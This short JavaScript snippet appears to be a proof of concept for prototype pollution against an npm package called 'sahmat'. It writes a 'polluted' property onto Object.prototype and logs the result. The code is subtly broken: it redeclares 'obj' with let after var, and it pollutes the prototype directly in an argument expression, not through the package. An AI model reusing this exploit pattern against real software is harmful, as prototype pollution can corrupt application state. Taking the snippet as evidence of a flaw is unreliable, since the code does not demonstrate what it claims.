var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const sahmat = require('sahmat');
let obj = { tmp: '' };
console.log({}.polluted);
sahmat(obj, 'tmp', obj.constructor.prototype.polluted = 'yes');
console.log('{ ' + obj.tmp.polluted + ', ' + 'yes' + ' }');